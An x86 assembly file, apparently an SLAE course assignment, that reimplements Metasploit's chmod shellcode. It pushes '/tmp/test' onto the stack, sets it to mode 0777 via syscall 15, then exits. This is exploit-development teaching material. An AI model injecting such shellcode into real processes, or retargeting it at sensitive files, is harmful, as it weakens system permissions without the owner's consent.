; Author: John Stigerwalt
; SLAE: Assignment #5
; Website: slae.whiteknightlabs.com
; Shellcode: chmod /tmp/test mode 0777
; Metasploit Re-Write of chmod with parameter "/tmp/test" mode 0777
; Shellcode using push dword method

global _start

section .text

_start:

cdq
push 0xf
pop eax
push edx

push dword 0x74736574
push dword 0x2f706d74
push dword 0x2f2f2f2f

mov ebx,esp
push edx

push 0x1ff
pop ecx
int 0x80
push 0x1
pop eax
int 0x80
